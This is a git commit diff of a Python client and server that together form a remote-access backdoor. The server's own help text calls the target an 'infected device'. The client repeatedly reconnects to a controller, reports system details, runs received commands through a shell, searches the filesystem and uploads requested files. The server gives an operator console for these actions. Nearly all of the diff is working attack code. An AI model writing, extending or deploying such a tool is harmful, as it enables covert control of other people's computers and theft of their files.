b2bbd199dc403cabc674846f74b92d6b9fcde5e3
Cristian Carrella <72307833+NEBbeby@users.noreply.github.com>
2022-11-03 13:09:07 +0100

    Shell Version

--- Chr/client.py
+++ Chr/client.py
@@ -1,35 +1,36 @@
 from socket import *
 import subprocess
+import platform
 import os
- 
- 
+import time
+
+windowsFlag = "n"
+
+
 def sendDir(clientSocket, cmd):
-    out = subprocess.check_output(cmd, shell=True).decode("utf-8", "ignore")
-    outputSize = str(out.__sizeof__())
-    clientSocket.send(outputSize.encode())
-    clientSocket.recv(1024)
-    clientSocket.send(out.encode())
- 
- 
+    shellCommandExecuter(clientSocket, cmd)
+
+
 def exitNClose(clientSocket):
     out = "Ok"
     clientSocket.send(out.encode())
     return True
- 
- 
+
+
 def changeDirectory(clientSocket, cmd):
     out = ""
     if cmd != "cd":
         cmd = cmd.replace("cd ", "")
         try:
+            print(cmd)
             os.chdir(cmd)
             os.system("dir")
             out = os.getcwd()
         except:
             out = "Path not found"
     clientSocket.send(out.encode())
- 
- 
+
+
 def getFile(clientSocket, fileName):
     fileSize = os.path.getsize(fileName)
     fileSize = str(fileSize)
@@ -46,42 +47,110 @@ def getFile(clientSocket, fileName):
         print("Caricamento...")
     print("Inviato")
     file.close()
- 
- 
-def main():
+
+
+def StartConnection():  # apre la connessione con il server
     serverName = 'localhost'
-    serverPort = 12003
+    serverPort = 12001
     clientSocket = socket(AF_INET, SOCK_STREAM)
-    clientSocket.connect((serverName, serverPort))
-    esc = False
- 
-    while not esc:
-        cmd = clientSocket.recv(1024).decode()
-        if len(cmd) == 0:
+
+    while True:
+        try:
+            clientSocket.connect((serverName, serverPort))
             break
- 
-        elif cmd == "dir" or "ls" in cmd:
-            sendDir(clientSocket, cmd)
- 
-        elif "cd" in cmd:
-            changeDirectory(clientSocket, cmd)
- 
-        elif cmd == "esc":
-            esc = exitNClose(clientSocket)
- 
-        elif "get" in cmd:
-            path = ""        
-            fileName = cmd.replace("get ", "")
-            path = os.path.join(path, os.getcwd(), fileName)
-            print(path)
-            if os.path.exists(path):
-                clientSocket.send("ok".encode())
-                getFile(clientSocket, fileName)
-            else:
-                clientSocket.send("ko".encode())
- 
-    clientSocket.close()
- 
- 
+        except:
+            print("Server down")
+
+        time.sleep(5)
+
+    return clientSocket
+
+
+def sendOsInfo(clientSocket: socket):  # funzione che invia informazioni di sistema
+    pack = "Architecture: " + platform.architecture()[
+        0] + "\nMacchine: " + platform.machine() + "\nSystem name: " + platform.system()
+    pack = pack + "\nOperating system release: " + platform.release() + "\nOperating system version: " + \
+           platform.version() + "\nNode: " + platform.node() + "\nPlatform: " + platform.platform() + "\nProcessor: " + platform.processor()
+    clientSocket.send(pack.encode())
+
+
+def RecuperaOs(clientSocket: socket):
+    global windowsFlag
+    if platform.machine().find("Windows"):
+        clientSocket.send("w".encode())
+        windowsFlag = "w"
+    else:
+        clientSocket.send("u".encode())
+        windowsFlag = "u"
+
+
+def searchCmd(clientSocket, cmd):
+    try:
+        shellCommandExecuter(clientSocket, cmd)
+        return True
+    except:
+        clientSocket.send("notFound".encode())
+        return False
+
+
+def shellCommandExecuter(clientSocket, cmd):
+    output = subprocess.check_output(cmd, shell=True).decode("utf-8", "ignore")
+    pSize = str(output.__sizeof__())
+    clientSocket.send(pSize.encode())
+    clientSocket.recv(1024) #87
+    clientSocket.send(output.encode()) #88
+
+
+def main():
+    while True:
+        try:
+            clientSocket = StartConnection()
+            RecuperaOs(clientSocket)
+            esc = False
+
+            while not esc:
+                cmd = clientSocket.recv(1024).decode()
+                if len(cmd) == 0:
+                    break
+
+                elif cmd == "dir" or "ls" in cmd:
+                    if windowsFlag == "w":
+                        sendDir(clientSocket, "dir")
+                    else:
+                        sendDir(clientSocket, "ls")
+
+                elif "cd" in cmd:
+                    changeDirectory(clientSocket, cmd)
+
+                elif cmd == "esc":
+                    esc = exitNClose(clientSocket)
+
+                elif "get" in cmd:
+                    path = ""
+                    fileName = cmd.replace("get ", "")
+                    path = os.path.join(path, os.getcwd(), fileName)
+                    print(path)
+                    if os.path.exists(path):
+                        clientSocket.send("ok".encode())
+                        getFile(clientSocket, fileName)
+                    else:
+                        clientSocket.send("ko".encode())
+
+                elif cmd == "infoOs":
+                    sendOsInfo(clientSocket)
+
+                elif "search" in cmd:
+                    shellCommand = clientSocket.recv(1024).decode() #78
+                    if searchCmd(clientSocket, shellCommand):
+                        print("true")
+                        path = clientSocket.recv(1024).decode() #155
+                        changeDirectory(clientSocket, "cd " + path)
+
+        except Exception as e:
+            print(e)
+            print("errore Riavvio in corso")
+            clientSocket.close()
+
+
 if __name__ == "__main__":
     main()
--- Chr/server.py
+++ Chr/server.py
@@ -1,72 +1,178 @@
+import os
 from socket import *
- 
- 
+import time
+from threading import Thread
+
+windowsFlag = "n"
+
+
+def animation():
+    print(".")
+    time.sleep(1)
+    print(".")
+    time.sleep(1)
+    print(".")
+
+
 def receiveDir(connectionSocket):
     outputSize = int(connectionSocket.recv(1024).decode())
     connectionSocket.send("OK".encode())
     out = connectionSocket.recv(outputSize).decode()
     print(out)
- 
- 
+
+
 def exitNClose(connectionSocket, cmd):
     connectionSocket.send(cmd.encode())
     out = connectionSocket.recv(1024).decode()
     return True
- 
- 
+
+
 def changeDirectory(connectionSocket):
     out = connectionSocket.recv(1024).decode()
     print(out)
- 
- 
+
+
 def getFile(connectionSocket, fileName):
-    fileSize = int(connectionSocket.recv(1024).decode())
-    file = open(fileName, 'wb')
-    while fileSize > 0:
-        if fileSize < 1024:
-            out = connectionSocket.recv(fileSize)
-        else:
-            out = connectionSocket.recv(1024)
-        fileSize = fileSize - 1024
-        file.write(out)
-        print("Ricevendo...")
-    print("Ricevuto")
-    file.close()
- 
- 
-def main():
-    serverPort = 12003
+    existFile = connectionSocket.recv(1024).decode()
+    if existFile == "ok":
+        fileSize = int(connectionSocket.recv(1024).decode())
+        file = open(fileName, 'wb')
+        while fileSize > 0:
+            if fileSize < 1024:
+                out = connectionSocket.recv(fileSize)
+            else:
+                out = connectionSocket.recv(1024)
+            fileSize = fileSize - 1024
+            file.write(out)
+            print("Ricevendo...")
+        print("Ricevuto")
+        file.close()
+    else:
+        print("File not found")
+
+
+def StartConnection():  # funzione di connessione (da controllare)
+    print('opening the server \n')
+    serverPort = 12001
     serverSocket = socket(AF_INET, SOCK_STREAM)
     serverSocket.bind(('', serverPort))
     serverSocket.listen(1)
-    print('The server is ready to receive')
-    connectionSocket, addr = serverSocket.accept()
-    print('Accepted a new client', addr)
+    print('Server Ready')
+    while True:
+        connectionSocket, addr = serverSocket.accept()
+        print('Connesso', addr)
+
+        if addr:
+            break
+
+    return connectionSocket
+
+
+def AssegnaWinFlag(connectionSocket: socket):
+    global windowsFlag
+    windowsFlag = connectionSocket.recv(2).decode()
+
+
+def LogOnFile(strPerFile: str):  # da usare da tutti per salvare i dati?
+    f = open("dati.txt", "a")  # forse dovremmo resettare il file a ogni avvio?
+    f.write(strPerFile)
+    f.close()
+
+
+def searchFile(connectionSocket, fileName):
+    global windowsFlag
+    if windowsFlag == "w":
+        cmd = "dir \"" + fileName + "\" /a /s"
+    else:
+        cmd = "find -name " + fileName
+    connectionSocket.send(cmd.encode())  # 143
+    print("Ricerca...")
+    t = Thread(target=animation)
+    t.start()
+    SizeOrError = connectionSocket.recv(1024).decode()  # 92 or 99
+    if SizeOrError == "notFound":
+        output = "File not found"
+        print("Ricerca fallita")
+    else:
+        pSize = int(SizeOrError)
+        mex = "Server pronto a ricevere l'output"
+        connectionSocket.send(mex.encode())  # 100
+        output = str(connectionSocket.recv(pSize).decode())  # 101
+        print(output)
+    return output
+
+
+def clearScreen():
+    global windowsFlag
+    if windowsFlag == "w":
+        os.system("cls")
+    else:
+        os.system("clear")
+
+
+def SplitLine(mystring):
+    for item in mystring.split("\n"):
+        if "Directory of" in item or "Directory di" in item:
+            if "Directory of" in item:
+                filteredPath = item.strip().replace("Directory of ", "")
+            else:
+                filteredPath = item.strip().replace("Directory di ", "")
+            print(filteredPath)
+            return filteredPath
+
+
+def main():
+    global windowsFlag, connectionSocket
     esc = False
     while not esc:
-        cmd = input('>>')
-        connectionSocket.send(cmd.encode())
+        try:
+            connectionSocket = StartConnection()  # apriamo connessione e inizializziamo
+            AssegnaWinFlag(connectionSocket)
+            help = "infoOs                          ricevi informazioni del sistema operativo\nsearch [nome file]              cerca un file nel " \
+                   "filesystem \nget [nome file]                 scarica il file dal dispositivo infetto\nesc                             chiudi la " \
+                   "sessione \nhelp                            guida comandi\ncd                              change directory\ndir/ls                          listing " \
+                   "directory \ncls                             clear console"
+            while not esc:
+                cmd = input('>>')
+                connectionSocket.send(cmd.encode())
 
-        #check se linux o windows
-        if cmd == "dir" or "ls" in cmd:
-            receiveDir(connectionSocket)
- 
-        elif cmd == "esc":
-            esc = exitNClose(connectionSocket, cmd)
- 
-        elif "cd" in cmd:
-            changeDirectory(connectionSocket)
- 
-        elif "get" in cmd:
-            fileName = cmd.replace("get ", "")
-            existFile = connectionSocket.recv(1024).decode()
-            if existFile == "ok":
-                getFile(connectionSocket, fileName)
-            else:
-                print("File not found")
- 
-    connectionSocket.close()
- 
- 
+                if cmd == "cls":
+                    print("cls")
+                    clearScreen()
+
+                elif cmd == "dir" or "ls" in cmd:
+                    receiveDir(connectionSocket)
+
+                elif cmd == "esc":
+                    esc = exitNClose(connectionSocket, cmd)
+
+                elif "cd" in cmd:
+                    changeDirectory(connectionSocket)
+
+                elif "get" in cmd:
+                    fileName = cmd.replace("get ", "")
+                    getFile(connectionSocket, fileName)
+
+                elif cmd == "infoOs":
+                    d = connectionSocket.recv(1024).decode()
+                    print(d)
+                    LogOnFile(d)
+
+                elif "search" in cmd:
+                    toSearch = cmd.replace("search ", "")
+                    output = searchFile(connectionSocket, toSearch)
+                    path = SplitLine(output)
+                    connectionSocket.send(path.encode())  # 146
+                    print("CWD: " + connectionSocket.recv(1024).decode())
+
+                elif cmd == "help":
+                    print(help)
+
+        except Exception as e:
+            print(e)
+            print("Errore! Riavvio in corso")
+            connectionSocket.close()
+
+
 if __name__ == "__main__":
     main()
